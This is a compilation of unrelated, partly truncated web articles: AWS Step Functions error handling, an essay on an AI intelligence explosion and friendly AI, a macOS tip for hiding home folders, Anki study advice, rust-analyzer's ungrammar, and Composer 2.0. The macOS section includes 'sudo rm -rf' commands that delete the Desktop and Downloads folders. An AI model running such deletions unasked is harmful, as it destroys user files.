<figure id="attachment_2960" aria-describedby="caption-attachment-2960"><img loading="lazy" src="https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.25.21-1024x882.png" alt="Step Function visual workflow" width="640" height="551" srcset="https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.25.21-1024x882.png 1024w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.25.21-300x258.png 300w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.25.21-768x661.png 768w, https://mk0dashbirdiotlcuqbg.kinstacdn.com/wp-content/uploads/2020/10/Screenshot-2020-10-22-at-11.25.21.png 1110w" sizes="(max-width: 640px) 100vw, 640px"><figcaption id="caption-attachment-2960"><em>Step Function visual workflow</em></figcaption></figure>

<p>In this example, you can see the Parallel branching task. This task is a perfect example representing how the entire execution will fail if only one state encounters an error.</p>
<p>Users are provided with Amazon State Language that helps them catch those errors and define all the retries. All this is extremely important for business-critical operations.</p>
<p>Amazon State Language allows you to place a comment, define when the state should start, and define the states and tasks. Moreover, suppose a customer handled an error. In that case, this tool allows you to specify the retries based on the error name, but also to specify the retry interval, as well as the number of retry maximum attempts, and backoff rate, which you can see in the example below:</p>

<p>In case you wish to catch errors, you’ll see why some states weren’t executed and which tasks have failed. See an example of how to catch an error in the graph below:</p>

<p>The first retry attempt will start at the pre-determined interval, and it gets multiplied by the backoff rate you’ve set.</p>
<p>Error handling is critical because if Parallel tasks execute successfully, but one fails, the entire execution will fail. However, even if the entire execution fails, the state changes will remain intact.</p>
<p>Error handling allows you to track everything that’s happened in the log, and by doing so, you’ll have a better insight on why some errors happened so you could handle the core problem.</p>
<h2><span><b>Step Function Demonstration</b></span></h2>
<h3><b>Choice Step Function Example</b></h3>
<p>You’ll have to input a preferred number into your function. For example, if you chose a number 10 and a customer buys more than ten items from you, the Step Function will execute successfully by following a preferred choice. In case a customer buys less than ten items, the execution will also be successful, but under a different pre-set choice.</p>
<h3><b>Retry Step Function Example</b></h3>
<p>It’s required that you specify the number of retries for all errors and define the interval, along with the number of maximum attempts. There you’ll see that it’s retrying to execute the function until it finally fails.</p>
<p>When the execution fails, you can check the logs in the Execution Event History tab to see how many times it started, but you’ll also be able to see the retries in between each start. You can access detailed information by following the CloudWatch logs link within the Event History tab.</p>
<h3><b>Catch Step Function Example</b></h3>
<p>Input a specific number range, and the function will execute based on the pre-set number. If the execution number goes outside the pre-set number range, the function will report a Range Error. However, if the number goes below the minimal pre-set number higher than zero, the function will report a Custom Error.</p>
<p>Error catch and error handling are essential for Step Functions since it allows for a successful, and error-free function execution.</p>
<h2><span><b>Step Functions Use Cases</b></span></h2>
<h3><b>When To Use Step Functions?</b></h3>
<p>Step Functions Standard workflow is excellent for business-critical workflows and brings along <a href="https://dashbird.io/knowledge-base/step-functions/why-use-step-functions/">numerous business benefits</a>. It provides much better error handling logic that Lambda Functions, while it’s relatively easy to orchestrate them. On the other hand, it’s meant more for business-critical ones since it pretty expensive compared to Express workflow. The Standard workflow price is USD$25 per one million executions with the additional cost for memory and duration of use.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>Comparing most powerful computers from 1956 to that of 2015, there's 1 trillion-fold increase in processing power.Although the technological progress has been accelerating, the human brain has not changed significantly in millenia and so some great minds have speculated that machines will surpass human levels of intelligence and ability at some point of time.</p>
<p>Machines have become really intelligent, fast, accurate and unbeatable for performing some task like playing chess, or DOTA2(the Open AI), doing complex calculations, weather forecasting and more. But the one thing that makes human special is their <em>Natural Intelligence</em>. But what if humans were able to design such intelligent system which in turn designs a new system more intelligent than itself and this cycle repeats ?</p>
<p>This will result in such an intelligence called "UltraIntelligence". There would then unquestionably be an ‘intelligence explosion’, and the intelligence of men would be left far behind. Thus the first ultraintelligent machine is the last invention that man need ever make.</p>
<p>But to be clear, nobody knows when is it going to happen, might be never or around 2500 or maybe around 2100. Maybe those prognosticators are right, and it will happen in the next thirty to eighty years.</p>
<p>Get yourself ready</p>
<p>There are another speculations however on How far along the intelligence explosion go.
Some believe that it will stop at the point that it reaches the full equivalent of human intelligence.</p>
<p>Why so? Because it is asserted that perhaps mankind exhibits the highest possible intelligence, and therefore there isn’t anything beyond it. In contrast, another viewpoint is that the AI intelligence explosion is going to zip right past human intelligence and land somewhere around so-called super-intelligence, also referred to as ultra-intelligence.</p>
<p>How high is up? Can’t say. Don’t know.</p>
<p>One belief is that this super-intelligence will undoubtedly be beyond our level of intelligence, and yet it will itself also have a boundary or final edge to it. It won’t be some amorphous intelligence that is all-consuming. Meanwhile, there are those though that suggest the AI intelligence explosion might be a never-ending chain reaction. AI intelligence might keep going and going, getting smarter and smarter, doing so for the rest of eternity.</p>
<blockquote>
<p>What would it mean for mankind if the AI intelligence explosion was something that once started was ever-expanding?</p>
</blockquote>
<p>This could be really good or ...really...really...bad</p>
<p>A machine superintelligence, if programmed with the right motivations, could potentially solve all the problems that humans are trying to solve but haven’t had the ingenuity or processing speed to solve yet. A superintelligence might cure disabilities and diseases, achieve world peace, give humans vastly longer and healthier lives, eliminate food and energy shortages, boost scientific discovery and space exploration, and so on.</p>
<p>Furthermore, humanity faces several existential risks in the 21st century, including global nuclear war, bioweapons, superviruses, and more.[56] A superintelligent machine would be more capable of solving those problems than humans are.</p>
<p>Sounds really cool so far right ? Now let's look at the downside</p>
<p>If programmed with the wrong motivations, a machine could be malevolent toward humans, and intentionally exterminate our species. More likely, it could be designed with motivations that initially appeared safe (and easy to program) to its designers, but that turn out to be best fulfilled (given sufficient power) by reallocating resources from sustaining human life to other projects.
 “the AI does not hate you, nor does it love you, but you are made out of atoms which it can use for something else.”, No strings attached.</p>
<blockquote>
<p>Can we add friendliness to any artificial intelligence design?</p>
</blockquote>
<p>Many AI designs that would generate an intelligence explosion would not have a ‘slot’ in which a goal (such as ‘be friendly to human interests’) could be placed. For example, if AI is made via whole brain emulation, or evolutionary algorithms, or neural nets, or reinforcement learning, the AI will end up with some goal as it self-improves, but that stable eventual goal may be very difficult to predict in advance.</p>
<p>Thus, in order to design a friendly AI, it is not sufficient to determine what ‘friendliness’ is (and to specify it clearly enough that even a superintelligence will interpret it the way we want it to). We must also figure out how to build a general intelligence that satisfies a goal at all, and that stably retains that goal as it edits its own code to make itself smarter. This task is perhaps the primary difficulty in designing friendly AI.</p>
<blockquote>
<p>Can we teach a superintelligence a moral code with machine learning?</p>
</blockquote>
<p>Some have proposed that  we teach machines a moral code with case-based machine learning. The basic idea is this: Human judges would rate thousands of actions, character traits, desires, laws, or institutions as having varying degrees of moral acceptability. The machine would then find the connections between these cases and learn the principles behind morality, such that it could apply those principles to determine the morality of new cases not encountered during its training. This kind of machine learning has already been used to design machines that can, for example, detect underwater mines after feeding the machine hundreds of cases of mines and not-mines.</p>
<p>There are several reasons machine learning does not present an easy solution for Friendly AI. The first is that, of course, humans themselves hold deep disagreements about what is moral and immoral. But even if humans could be made to agree on all the training cases, at least two problems remain.</p>
<p>The first problem is that training on cases from our present reality may not result in a machine that will make correct ethical decisions in a world radically reshaped by superintelligence.</p>
<p>The second problem is that a superintelligence may generalize the wrong principles due to coincidental patterns in the training data.Consider the parable of the machine trained to recognize camouflaged tanks in a forest. Researchers take 100 photos of camouflaged tanks and 100 photos of trees. They then train the machine on 50 photos of each, so that it learns to distinguish camouflaged tanks from trees. As a test, they show the machine the remaining 50 photos of each, and it classifies each one correctly. Success! However, later tests show that the machine classifies additional photos of camouflaged tanks and trees poorly. The problem turns out to be that the researchers’ photos of camouflaged tanks had been taken on cloudy days, while their photos of trees had been taken on sunny days. The machine had learned to distinguish cloudy days from sunny days, not camouflaged tanks from trees.</p>
<p>Thus, it seems that trustworthy Friendly AI design must involve detailed models of the underlying processes generating human moral judgments, not only surface similarities of cases.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">




<p>Apple computers ship with a custom operating system - macOS, which has a few annoying features.
Among the annoyances a special place has to be reserved for the inability to remove or rename the folders located in <code>$HOME</code>.
Here I describe my way of dealing with this problem.</p>

<h2 id="hidingdefaultfolders">Hiding default folders</h2>

<p>On the web countless macOS users are looking for answers to the same question: “How can I get rid of ‘Desktop’, ‘Documents’, ‘Downloads’, ‘Library’, ‘Movies’, ‘Music’, ‘Pictures’, and ‘Public’ folders?”
Multiple suggestions are provided as possible solutions.
You can: replace the folders with files<a href="#fn:1" id="fnref:1" title="see footnote"><sup>○</sup></a>; hide the folders from ‘Finder’ and make them inaccessible<a href="#fn:2" id="fnref:2" title="see footnote"><sup>○</sup></a>; or simply learn to live with them, as the system will recreate those folders by itself anyway<a href="#fn:3" id="fnref:3" title="see footnote"><sup>○</sup></a>.</p>

<p>I decided to hide.
But, when working in the command line, hiding these folders from Finder is not enough.
Below are three settings that, while not covering all corner cases, go a long way.</p>

<ol>
<li><p>hide from <code>Finder</code> by adding a hidden flag</p>

<pre><code>chflags hidden ~/Desktop ~/Documents ~/Downloads ~/Library
chflags hidden ~/Movies ~/Music ~/Pictures ~/Public
</code></pre></li>
<li><p>hide from <code>ls</code> by creating an alias in <code>.bashrc</code></p>

<pre><code>alias ls='ls -I Desktop -I Documents -I Downloads -I Library\
             -I Movies -I Music -I Pictures -I Public'
</code></pre></li>
<li><p>hide from tab completion by setting a special bash <code>FIGNORE</code><a href="#fn:4" id="fnref:4" title="see footnote"><sup>○</sup></a> variable.</p>

<pre><code>export FIGNORE=Desktop:Documents:Downloads:Library:Movies:Music:Pictures:Public
</code></pre></li>
</ol>

<p>That is it, the folders should mostly be out of view.
And if for whatever reason we need to temporary see them again a simple <code>\ls</code> would bypass the alias and provide us the full list.</p>

<h2 id="creatinganewhierarchy">Creating a new hierarchy</h2>

<p>With the folders out of view we can now move onto creating our own home hierarchy.
This part mostly depends on the needs of the user.
But I would like to offer one piece of advice: make sure your folders start with unique lowercase letters.
This will allow you to auto-complete folder names after typing a single character and offer extra protection against invoking a command on one of those default hidden folders, that start with upper case letters.</p>

<p>In my case the new hierarchy looks like this:</p>

<pre><code>├── base
│   ├─── bin
│   ├─── etc
│   ├─── src
│   └─── var
│
├── desk
│
├── file
│   ├─── articles
│   ├─── books
│   ├─── documents
│   ├─── essays
│   ├─── photos
│   └─── videos
│
└── work
    ├─── active_project_one
    ├─── active_project_two
    └─── zzz
         ├─── inactive_project_one
         ├─── inactive_project_two
         ├─── inactive_project_three
         ├─── inactive_project_four
         └─── ...
</code></pre>

<p><code>'base'</code> is a substitute for <code>'.local'</code>.<br>
<code>'desk'</code> takes the place of the <code>'Desktop'</code> and <code>'Downloads'</code>.<br>
<code>'file'</code> is an aggregate of <code>'Documents'</code>, <code>'Music'</code>, <code>'Pictures'</code>, and <code>'Movies'</code>.<br>
<code>'work'</code> stores various active and completed projects.</p>

<h2 id="linkingdownloadsanddesktop">Linking Downloads and Desktop</h2>

<p>There is one detail remaining: macOS has a useful <code>'Desktop'</code> and now its hidden from us.
On top of that some third party applications put various acquired data into the <code>'Downloads'</code> folder.
Hence, we want to see the contents of those folders within our new file hierarchy.
We achieve this with symbolic links.</p>

<ol>
<li><p>make <code>'Desktop'</code> be a symbolic link for our new folder <code>'desk'</code></p>

<pre><code>sudo rm -rf Desktop
ln -s desk Desktop
</code></pre></li>
<li><p>make <code>'Downloads'</code> be a symbolic link for <code>'Desktop'</code></p>

<pre><code>sudo rm -rf Downloads
ln -s Desktop Downloads
</code></pre></li>
</ol>

<p>And now whenever a file is put into the, now hidden, <code>'Downloads'</code> or <code>'Desktop'</code> folders, it will be placed in our <code>'desk'</code> instead.
Moreover, since <code>'Desktop'</code> is a link to <code>'desk'</code>, whatever is put into the <code>'desk'</code> directory will be visible on the actual desktop on a screen.</p>

<h2 id="theresult">The result</h2>

<pre><code>$ ls ~/
base desk file work

$ cd ~/D&lt;tab&gt;
$ cd ~/D

$ cd ~/d&lt;tab&gt;
$ cd ~/desk
</code></pre>

<h2 id="summary">Summary</h2>

<p>Getting rid of default macOS home directories is hard.
Hiding, instead of trying to delete, seems like an easier and safer solution.
The tricks presented in this article, while not being 100% effective, go along way.
I’ve been using this approach for a few years without accidentally seeing any reminder of those folders during this whole time.</p>

        <p><em>Patrick Stevens is a Developer at G-Research.</em></p>
<p>TL;DR: <em>If you aren’t using <a href="https://apps.ankiweb.net/">Anki</a> or one of its siblings to remember what you learn, you are missing out on literal superpowers. There are specific techniques which I’ve found helpful for using it to learn maths and computer science in particular.</em></p>
<p>This post will discuss extremely briefly what Anki is, but is mainly aimed at helping the student of maths or computer science to squeeze out some extra droplets of productivity from it. If you aren’t already familiar with Anki, go and read Michael Nielsen’s post <a href="http://augmentingcognition.com/ltm.html">Augmenting Long-Term Memory</a> as well or instead of this one; if you’re short of time, the main value of the post to someone new to Anki is in the first one-eighth or so, up to but not including “Using Anki to thoroughly read a research paper in an unfamiliar field”. That essay gives a broad-strokes motivation for why one might want to use Anki at all. (Spoiler: it gives you a superhuman memory!)</p>
<h2 id="what-is-anki-">What is Anki?</h2>
<p><a href="https://apps.ankiweb.net/">Anki</a> is a <a href="https://en.wikipedia.org/wiki/Spaced_repetition">spaced repetition system</a>: essentially a program that shows you flashcards at intervals tailored to help you remember their contents. Such systems are based on the observation that while you can’t stop memories from decaying, repeated exposure makes the decay exponentially slower.</p>
<p>So while you need to rehearse a fact frequently when you first come to learn it, reviews can become very sparse very quickly without losing much of your hard-won memory.</p>
<p>Anki is only one such system; other implementations such as SuperMemo and Mnemosyne exist.<br>
There are also applications using the same principles for more specific goals; for example, Memrise is designed for language learning. This post is phrased in terms of Anki, because for historical reasons that’s the one I use.</p>

<p>I’ve placed this section at the start, because I believe that spaced repetition is genuinely a superpower that anyone can acquire. If I can’t hold your interest in this post, I encourage you to glance over these other resources in the hope that one of them does the trick!</p>
<ul>
<li><a href="http://augmentingcognition.com/ltm.html">Augmenting Long-Term Memory</a> –&nbsp; a brief introduction to various memory systems with a particular focus on Anki. The money quote: “Anki makes memory a choice”. If you choose to remember something, you can.</li>
<li><a href="https://quantum.country/">Quantum Country</a> – an introduction to quantum computation with integrated spaced-repetition flashcards, which comes with emailed reminders to use the site at intervals. Even if you have no interest in quantum computation, I recommend skimming at least the first bits of the site, so that you can see what really good flashcards based on a text can look like. (Note that some of its cards are not ideal; the site does sometimes fall into the “yes/no” pattern, with flashcards whose answer is a bald “yes” or “no”. Cards of this form aren’t as good as cards which get you to reproduce actually content-based parts of a fact.)</li>
<li><a href="https://www.supermemo.com/en/archives1990-2015/articles/20rules">The Twenty Rules of Formulating Knowledge in Learning</a> – the creator of the spaced-repetition system SuperMemo discusses how to formulate knowledge so that it sticks. Again, even if you don’t use spaced repetition, definitely read this; the advice is absolutely foundational to my understanding of how to learn. A nontrivial amount of this very blog post is essentially specialising some of these rules to the case of maths and computer science.</li>
<li><a href="https://www.reddit.com/r/medicalschoolanki/">Reddit: Medical School Anki</a>, a subreddit with almost 55,000 subscribers at the time of writing. This link is here just to demonstrate that there are fields (such as medicine) in which Anki is very popular and nowhere near as niche as it is in most areas.</li>
</ul>

<p>Absolutely crucial to the effective use of Anki for even a moderate collection of cards is that answering a card should be a single mental motion.</p>
<p>What does this mean? We’ll demonstrate with some positive and negative examples.</p>
<ul>
<li>“What is the capital of France?” is probably answered with a single mental motion: it’s just “Paris”, obtained by a simple lookup in your memory.</li>
<li>“What is 367 times 399?” is many mental motions unless you are really unusually good at mental arithmetic. Almost everyone has to carry out some algorithm to get an answer to this question.</li>
<li>“What is the composition of air?” is probably many mental motions: for example, a lookup of “which gases are in air?” and a number of motions like “what proportion of air is this specific gas?”. Or it could be the various mental motions of “Which gas is the nth most common in air, and what is its proportion in air?” as n varies.</li>
<li>“What is the most common gas in air, and what is its proportion?” is very possibly a single mental motion despite the multiple components in its answer. For me, the knowledge that “nitrogen is the most common gas in air” is intimately bound up with “78% of air is nitrogen”; to answer one question is to access the same mental lump of storage as is required to answer the other question. Of course, for someone else, this may be two distinct facts and two distinct memory lookups.</li>
</ul>
<p>A card that is answered with one mental motion may be multiple motions for someone else; and a question answered with many mental motions may become one motion after you learn some additional fact or part of the model that ties the facts together. So it’s helpful if you personally keep track of what you’re doing to answer a given card, so that you can recognise some of this structure in your own mind.</p>
<p>Any card which is multiple mental motions should be broken down into smaller chunks.</p>
<p>If you’re doing too much work to answer a card, it’s important to notice, so that you can break the card down. And don’t worry that you might “break down a card too much”; if the cards are easy, Anki will exponentially decrease how often it shows them to you. The cost of creating a card that’s too easy is almost entirely in the time it takes you to create the card in the first place; a card that’s too difficult will sap your time and energy again and again.</p>

<p>As an example, recall the <a href="https://en.wikipedia.org/wiki/Ratio_test">ratio test for convergence</a>, likely to be covered in any first course in analysis:</p>
<p><em>Let$\sum_{n=1}^{\infty} a_n$ be a complex series, with each $a_i$ nonzero.<br>
Suppose that there is $a$ such that $|\frac{a_{n+1}}{a_n}| \to a$.<br>
Then, if $a &lt; 1$ then the series converges absolutely; if $a &gt; 1$ then the series diverges.</em></p>
<p>(We’ll discuss its proof in a later section.)</p>
<p>This statement has a number of moving parts, and is definitely much too large to appear as a single card. (Remember the rule of thumb: answering a single card should be a single mental motion.)<br>
How could we formulate this statement in an Anki-friendly way?</p>
<p>My own personal Anki collection contains the following cards. (Anki does allow LaTeX, though I often optimise for speed of card creation and just use plain text, however ugly it ends up. As long as it’s easily legible, it doesn’t need to be pretty.)</p>
<ul>
<li>What conditions exist on the ratio test? (answer: nonzero, sequence of ratios has a limit)</li>
<li>When does the ratio test let us conclude something? (answer: successive ratios converge to something not equal to 1)</li>
<li>Which cases exist on the ratio test? (answer: ratios converge to less than, or greater than, 1)</li>
<li>What can we say from the ratio test if the ratios converge to something less than 1? (answer: converges absolutely)</li>
<li>What can we say from the ratio test if the ratios converge to something greater than 1? (answer: diverges)</li>
<li>What can we say from the ratio test if the ratios converge to 1? (answer: nothing)</li>
<li>Give an example where the ratio test is inconclusive. (answer: <a href="https://en.wikipedia.org/wiki/Harmonic_series_(mathematics)">harmonic series</a>)</li>
</ul>
<p>All these cards are very simple; perhaps they might look laughably simple. This is fine! Remember that Anki will rapidly stop showing you cards you already know. Crucially each card is really a single mental motion to answer.</p>
<p>Note also that information is duplicated between cards. For example, there are two cards saying in slightly different ways that the ratio test talks about when successive ratios converge to something not equal to 1. Again, it’s fine to repeat information, because cards are cheap. Here, the information is duplicated to better facilitate the links between the cards: one card is a general “when can we conclude anything”, and one card is the same information rephrased as “which cases do I need to consider to produce more information here”. Without the additional rephrasing, there’s more of a risk of developing “isolated” clusters of cards; the aim is that given just the prompt “ratio test”, I can reproduce the <em>entire</em> cluster without thinking any further.</p>
<p>And don’t forget to store key examples and counterexamples!</p>

<p>Remembering a definition is rather like remembering the statement of a theorem.<br>
Without further ado, here is my definition of a <a href="https://en.wikipedia.org/wiki/Red-black_tree">red-black tree</a>:</p>
<ul>
<li>What, imprecisely, are the colouring rules on a red-black tree? (“global; local; base-case”)</li>
<li>What are the leaves of a red-black tree? (“null, black”)</li>
<li>What is the base-case colouring rule of a red-black tree? (“leaves are black”)</li>
<li>What is the local colouring rule of a red-black tree? (“red node =&gt; black children”)</li>
<li>What is the global colouring rule of a red-black tree? (“black depth is well defined”)</li>
<li>What is the black depth of a node in a red-black tree? (“the number of black nodes encountered on a path from that node down to a leaf”)</li>
</ul>
<p>Again, there is some duplication (two cards note that the leaves of a red-black tree are coloured black), and all the cards are extremely simple. The point is to make sure not only that the actual <em>content</em> is remembered, but also that the content is interlinked enough that you can reproduce the entire definition from the single prompt “red-black tree”. Moreover, one card is explicitly structural and carries no actual content as such: the card that lists the three types of colouring rule. This card is there solely to allow me to remember which <em>cards</em> are relevant.</p>
<p>Naively, one might create instead a single card, “what is a red-black tree?”. But in my experience, this is too big. If you’re reviewing even 30 cards a day, and …</p></div></div></div>

October 24, 2020 | https://rust-analyzer.github.io//blog/2020/10/24/introducing-ungrammar.html | <a href="https://web.archive.org/web/*/https://rust-analyzer.github.io//blog/2020/10/24/introducing-ungrammar.html">archive.org</a>

<p>So, what exactly does “describing syntax trees” mean and why is it useful?
When writing an IDE, one of the core data structure is the concrete syntax tree.
It is a full-fidelity tree which represents the original source code in detail, including parenthesis, comments, and whitespace.
CSTs are used for initial analysis of the language.
They are also a vocabulary type for refactors.
Although the ultimate result of a refactor is a text diff, tree modification is a more convenient internal representation.</p>

<p>At the lowest level, the CST is typically unityped: there’s some <code>Node</code> superclass, which has a collection of <code>Node</code> children and an optional <code>Node</code> parent.
On top of this raw layer, a more AST-like API is provided: <code>Struct</code> has a <code>.name()</code> and a list of <code>.fields()</code>, etc.
This typed API is huge!
For rust-analyzer, it is comprised of more than 130 <em>types</em>!
And it is also more detailed than a typical AST: <code>Struct</code> also has <code>.l_curly()</code> and <code>.r_curly()</code>.</p>
<p>What’s worse, this API changes a lot, especially at the beginning.
You may start with nesting <code>.fields()</code> directly under the <code>Struct</code>, but then introduce a <code>StructFields</code> node for everything between the curly braces to share the code with enum variants.</p>
<p>In short, writing this by hand sucks :-)
Ungrammar is a notation to concisely describe the structure of the syntax tree, which can be used by a code generator to build an API in the target language.
If you’ve heard about <a href="https://www.oilshell.org/blog/2016/12/11.html">ASDL</a>, ungrammar is ASDL for concrete syntax trees.
For rust-analyzer’s case, that means taking the following input:</p>
<div>
<div>
<pre><code><table><tbody><tr><td><pre>1
2
3
4
</pre></td><td><pre>Module =
  Attr* Visibility?
  'mod' Name
  (ItemList | ';')
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>And generating the following output:</p>
<div>
<div>
<pre><code data-lang="rust"><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
</pre></td><td><pre><span>impl</span> <span>ast</span><span>::</span><span>AttrsOwner</span>      <span>for</span> <span>Module</span> <span>{}</span>
<span>impl</span> <span>ast</span><span>::</span><span>VisibilityOwner</span> <span>for</span> <span>Module</span> <span>{}</span>
<span>impl</span> <span>ast</span><span>::</span><span>NameOwner</span>       <span>for</span> <span>Module</span> <span>{}</span>
<span>impl</span> <span>Module</span> <span>{</span>
    <span>pub</span> <span>fn</span> <span>mod_token</span><span>(</span><span>&amp;</span><span>self</span><span>)</span>       <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>SyntaxToken</span><span>&gt;</span> <span>{</span> <span>...</span> <span>}</span>
    <span>pub</span> <span>fn</span> <span>item_list</span><span>(</span><span>&amp;</span><span>self</span><span>)</span>       <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>ItemList</span><span>&gt;</span>    <span>{</span> <span>...</span> <span>}</span>
    <span>pub</span> <span>fn</span> <span>semicolon_token</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>SyntaxToken</span><span>&gt;</span> <span>{</span> <span>...</span> <span>}</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>In typical parser generators, something similar can be achieved by generating <em>both</em> the parser and the syntax tree from the same grammar.
This works to some extent, but has an inherent problem that the shape of the tree you want for the programmatic API, and the shape of the grammar you need to implement the parser are often different.
“Technical” transformations like left-recursion elimination don’t affect the language described by the grammar, but completely change the shape of the parse tree.
In contrast, ungrammar focuses solely on the second task, which radically reduces the complexity of the grammar.
In rust-analyzer, it is paired with a hand-written parser.</p>
<p>Treated as an ordinary (context free) grammar, ungrammar describes a superset of the language.
For example, for programmatic API it might be convenient to treat commas in comma-separate lists as a part of the list element
(rust-analyzer doesn’t do this yet, but it should).
This leads to the following ungrammar, which obviously doesn’t treat commas precisely:</p>
<div>
<div>
<pre><code><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre>FieldList =
  '{' Field* '}'

Field:
  Name ':' Type ','?
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>Similarly, ungrammar defines binary and unary expressions, but doesn’t specify their relative precedence and associativity.</p>
<p>An interesting side-effect is that the resulting grammars turn out to be pretty human readable.
For example, a full production ready Rust grammar takes about 600 short lines:<br></p>

<p>This might be a good fit for reference documentation!</p>

                <div>
                    <h2 id="1-what-s-new">1/ What's new?</h2><p>The list of changes and improvements is long, check the <a href="https://github.com/composer/composer/releases/tag/2.0.0">complete changelog</a> if you are interested in reading it all. I will highlight a few key points here.</p><h3 id="performance-improvements">Performance improvements</h3><p>We overhauled pretty much everything from the protocol used between Composer and packagist.org to the dependency resolution, including downloading files in parallel using curl and constraint evaluation optimizations. This leads to massive improvements in terms of both speed and memory usage. The difference depends on your use case, so while I've seen reports of improvements of over 50% to both in some projects, I cannot put an exact number on it. But I am sure you will be positively surprised if you haven't tried Composer 2 yet.</p><p>As a side note to this, <code>require</code>/<code>remove</code> and partial updates are now much faster because Composer will now only load the metadata of the packages which are being changed.</p><figure><img src="https://blog.packagist.com/content/images/2020/10/image_2020-10-24_175318.png" alt="" srcset="https://blog.packagist.com/content/images/size/w600/2020/10/image_2020-10-24_175318.png 600w, https://blog.packagist.com/content/images/size/w1000/2020/10/image_2020-10-24_175318.png 1000w, https://blog.packagist.com/content/images/2020/10/image_2020-10-24_175318.png 1455w" sizes="(min-width: 1200px) 1200px"><figcaption>Time for initial update + install (bootstrapped project, empty cache) shows roughly 60% less time used by Composer 2 with ext-curl enabled</figcaption></figure><h3 id="architectural-changes-and-determinism">Architectural changes and determinism</h3><p>The way dependency updates are done internally was refactored, which, for you, will result in more deterministic updates. The current local state of the vendor directory will not interfere in updates anymore. </p><p>After an update is complete, the install process is run automatically and it will now execute all network bound operations first - and in parallel if possible. This will avoid leaving you with a half-updated vendor directory if a network error occurs midway through installation.</p><h3 id="runtime-features">Runtime features</h3><p>We added a <a href="https://getcomposer.org/doc/07-runtime.md#platform-check">platform-check step</a> when <code>vendor/autoload.php</code> gets initialized which checks the current PHP version/extensions match what is expected by your dependencies and fails hard otherwise.</p><p>There is a new class, <code>Composer\InstalledVersions</code>, which is autoloaded in every project and is available at runtime. It allows you to check which packages/versions are present at runtime of your own project.</p><p>See the <a href="https://getcomposer.org/doc/07-runtime.md">runtime docs</a> for more details.</p><p>If your code relies on any of these runtime features, you should require <code>"composer-runtime-api": "^2.0"</code> in your composer.json. This is a virtual package which is provided by Composer and will make sure people have to use Composer 2.x to install your package.</p><h3 id="error-reporting-improvements">Error reporting improvements</h3><p>Because things don't always go the way they're supposed to, we made sure to improve the error reporting shown to you when dependencies cannot be resolved. It's hard to give concrete examples here as there are a million ways this can fail but you will hopefully notice that messages are now shorter, clearer and less repetitive.</p><h3 id="partial-updates-with-temporary-constraints">Partial updates with temporary constraints</h3><p>Sometimes it can be useful to upgrade or downgrade a single package to a specific version, perhaps temporarily to test something or wait for a bug fix. You can now run <code>composer update vendor/package:1.0.*</code> for example (or <code>1.0.12</code> or any other version constraint), to run an update of only <code>vendor/package</code> to a version matching this additional constraint. This will not update your require in composer.json, and it will not mark the lock file out of date.</p><p>If you want to add/restrict a constraint but still do a full update of all dependencies, you can use <code>update --with vendor/package:1.0.*</code> which will run the update with that additional constraint.</p><h2 id="2-how-easy-is-it-to-upgrade">2/ How easy is it to upgrade?</h2><p>Our goal is that every Composer user can upgrade smoothly and swiftly. The gains are huge and we want everyone to benefit from them. To achieve that we did a few things:</p><ul><li>Composer 2.0 still supports PHP 5.3 and above, much like Composer 1.x</li><li><code>composer.lock</code> files are interoperable between versions, so you can upgrade to 2.0 and roll back easily if needed.</li><li>Most commands and arguments remain the same, and largely what you know about Composer remains true in 2.0.</li></ul><p>If you run <code>composer self-update</code> from 1.x, it will warn you that a new stable major version of Composer is available, and you can use <code>composer self-update --2</code> to migrate to it.</p><p>Should you encounter issues, you can go back at any time by using <code>composer self-update --1</code>. Hopefully that will make everyone feel comfortable to experiment with the new release.</p><p>If you are <a href="https://getcomposer.org/doc/faqs/how-to-install-composer-programmatically.md">installing Composer automatically</a> from the installer script, and wish to remain on Composer 1.x for the time being, you can also pass it a <code>--1</code> argument to prevent it from installing Composer 2.0 by default. If you do this please remember and aim to upgrade in a timely manner, as Composer 1.x will not be maintained for very long.</p><h2 id="3-backwards-compatibility-breaks">3/ Backwards compatibility breaks?</h2><p>Here are the main things likely to cause trouble with the upgrade process:</p><ul><li><strong>Plugins</strong>: This is probably going to be the major source of problems for most people. Plugins need to be updated to support Composer 2, and some of them are not ready, yet. Composer 2 will complain and fail to resolve dependencies if a plugin does not support it, so no need to overthink it, you can try it out and see how it goes.</li><li>The new <strong>platform-check feature</strong> means that Composer checks the runtime PHP version and available extensions to ensure they match the project dependencies. If a mismatch is found, the autoloader exits with error details to make sure problems are not overlooked. To avoid issues when deploying to production it is recommended to run <code>composer check-platform-reqs --no-dev</code> with the production PHP process as part of your build or deployment process.</li><li><strong>Repository priority</strong>: If a package exists in a higher priority repository, it will now be entirely ignored in lower priority repositories. If you seem to be missing packages when using Composer 2, see <a href="https://getcomposer.org/repoprio">repository priorities docs</a> for details.</li><li><strong>Invalid PSR-0 / PSR-4 configurations</strong> will not autoload anymore in optimized-autoloader mode, as per the warnings introduced in Composer 1.10. Mostly these warnings were for classes that were not meant to autoload anyway so I don't expect major issues, but it's safer to clean these up before upgrading.</li></ul><p>If you want to know more, I would highly recommend reading the <a href="https://github.com/composer/composer/blob/master/UPGRADE-2.0.md">UPGRADE</a> guide which has multiple sections for end users, plugin authors and Composer repository implementors.</p><h2 id="4-what-s-next">4/ What's next?</h2><p>We don't have a very detailed feature roadmap anymore as 2.0 contains tons of new goodies, but one important thing I want to explain is our PHP version support going forward.</p><p>As I mentioned above, Composer 2.0 supports PHP 5.3+, which is at this point very outdated and makes the code quite hard to maintain in places. We went through the effort to make sure every Composer user can upgrade to Composer 2, 